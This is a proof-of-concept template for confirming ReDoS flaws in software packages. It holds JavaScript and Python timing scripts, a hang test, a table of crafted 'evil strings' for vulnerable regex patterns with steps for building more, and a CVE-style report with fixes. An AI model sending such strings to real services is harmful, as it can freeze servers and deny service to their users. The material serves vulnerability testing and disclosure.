# PoC Skeleton -- ReDoS

## JavaScript Timing Measurement (Primary)

```js
/**
 * CVE-CANDIDATE: ReDoS in [package-name] [version]
 * CWE: CWE-1333 (Inefficient Regular Expression Complexity)
 * CVSS: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
 */

// Step 1: The vulnerable regex (extracted from source)
const regex = /VULNERABLE_PATTERN/;

// Step 2: Measure timing with increasing input
console.log('ReDoS Timing Measurement');
console.log('========================');
console.log('Length | Time (ms)  | Ratio | Verdict');
console.log('-------|------------|-------|--------');

let prevTime = 0;
for (let len = 15; len <= 35; len++) {
  const evil = 'a'.repeat(len) + '!';
  const start = performance.now();
  regex.test(evil);
  const elapsed = performance.now() - start;
  const ratio = prevTime > 0.01 ? (elapsed / prevTime).toFixed(1) : '-';
  const verdict = ratio !== '-' && parseFloat(ratio) > 1.8 ? 'EXPONENTIAL' : '';
  console.log(
    `${String(len).padStart(6)} | ${elapsed.toFixed(2).padStart(10)} | ${String(ratio).padStart(5)} | ${verdict}`
  );
  prevTime = elapsed;
}

// Step 3: Confirm through library API
const pkg = require('[package-name]');
console.log('\nThrough library API:');
for (let len = 20; len <= 30; len += 5) {
  const evil = 'a'.repeat(len) + '!';
  const start = performance.now();
  try { pkg.validate(evil); } catch (e) { /* expected */ }
  const elapsed = performance.now() - start;
  console.log(`Length ${len}: ${elapsed.toFixed(2)}ms`);
}
```

**Expected output for confirmed ReDoS:**
```
Length | Time (ms)  | Ratio | Verdict
-------|------------|-------|--------
    15 |       0.05 |     - |
    16 |       0.10 |   2.0 | EXPONENTIAL
    17 |       0.20 |   2.0 | EXPONENTIAL
    ...
    25 |      51.20 |   2.0 | EXPONENTIAL
    30 |    1638.40 |   2.0 | EXPONENTIAL  <-- 1.6 seconds
    35 |   52428.80 |   2.0 | EXPONENTIAL  <-- 52 seconds
```

## Python Timing Measurement

```python
#!/usr/bin/env python3
"""
CVE-CANDIDATE: ReDoS in [package-name] [version]
CWE: CWE-1333 (Inefficient Regular Expression Complexity)
CVSS: 7.5 HIGH (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
"""
import re
import time

# The vulnerable regex (extracted from source)
pattern = re.compile(r'VULNERABLE_PATTERN')

print('ReDoS Timing Measurement')
print('========================')
print(f'{"Length":>6} | {"Time (s)":>10} | {"Ratio":>5}')
print('-' * 30)

prev_time = 0
for length in range(15, 36):
    evil = 'a' * length + '!'
    start = time.monotonic()
    pattern.search(evil)
    elapsed = time.monotonic() - start
    ratio = f'{elapsed / prev_time:.1f}' if prev_time > 0.0001 else '-'
    print(f'{length:6d} | {elapsed:10.4f} | {ratio:>5}')
    prev_time = elapsed
```

## Node.js Subprocess Test (for OOM/Hang Verification)

```js
/**
 * Run regex in a child process to demonstrate server hang without
 * crashing the test harness. Uses execSync with timeout.
 */
const { execSync } = require('child_process');

const TIMEOUT_MS = 10000; // 10 seconds

const code = `
  const regex = /VULNERABLE_PATTERN/;
  const evil = 'a'.repeat(30) + '!';
  regex.test(evil);
  console.log('COMPLETED');
`;

try {
  const result = execSync(
    'node -e "' + code.replace(/"/g, '\\"').replace(/\n/g, ' ') + '"',
    { timeout: TIMEOUT_MS, encoding: 'utf-8' }
  );
  console.log('[!] Regex completed within timeout -- NOT ReDoS');
} catch (err) {
  if (err.killed) {
    console.log('[+] Process killed after timeout -- CONFIRMED ReDoS');
    console.log('[+] Regex hung for >' + (TIMEOUT_MS / 1000) + 's on 30-char input');
  } else {
    console.log('[?] Process exited with error: ' + err.message);
  }
}
```

## Quick One-Liner Test

```bash
# Quick test: does this regex hang on 25 'a's followed by '!'?
timeout 5 node -e "/(a+)+\$/.test('a'.repeat(25)+'!')" && echo "SAFE" || echo "HUNG -- ReDoS confirmed"
```

## Evil String Construction Guide

| Vulnerable Pattern | Evil String | Expected Growth |
|-------------------|-------------|-----------------|
| `(a+)+$` | `"a" * N + "!"` | O(2^N) |
| `(a+b?)+$` | `"a" * N + "!"` | O(2^N) |
| `(a\|aa)+$` | `"a" * N + "!"` | O(2^N) |
| `(a\|a)+$` | `"a" * N + "!"` | O(2^N) |
| `([a-zA-Z]+)*$` | `"a" * N + "1"` | O(2^N) |
| `(\s+$)` | `" " * N + "x"` | O(N^2) |
| `(.*a){10}$` | `"a" * N + "!"` | O(N^10) |
| `(\w+\.)+\w+$` | `"a." * N + "!"` | O(2^N) |
| `(\d+\.?\d*)+$` | `"1" * N + "a"` | O(2^N) |

**Constructing evil strings for arbitrary patterns:**
1. Find a character that the quantified group CAN match
2. Repeat it N times
3. Append a character the overall pattern CANNOT accept (forces backtrack)
4. The anchor `$` or a following literal that doesn't match forces the engine to try all splits

## Reporting Template

```markdown
## ReDoS in [package] v[version]

**File**: `src/[file].js:LINE`
**Regex**: `/PATTERN/` at line LINE
**Applied to**: user-supplied [input type] via [function/endpoint]
**Growth rate**: Exponential O(2^N) -- time doubles per additional character

### Timing Evidence

| Input Length | Time (ms) | Ratio |
|-------------|-----------|-------|
| 20 | 3 | - |
| 22 | 12 | 2.0x |
| 24 | 48 | 2.0x |
| 26 | 192 | 2.0x |
| 28 | 768 | 2.0x |
| 30 | 3,072 | 2.0x |

### Impact

Denial of Service. An attacker can send a crafted [input type] of ~30
characters that causes the regex engine to backtrack exponentially,
freezing the Node.js event loop for seconds to minutes. This blocks
all concurrent request processing on the server.

### Suggested Fix

Option A: Replace regex with a non-backtracking parser
Option B: Rewrite regex to avoid nested quantifiers
Option C: Add input length limit before regex application
Option D: Use atomic groups/possessive quantifiers (if engine supports)
```
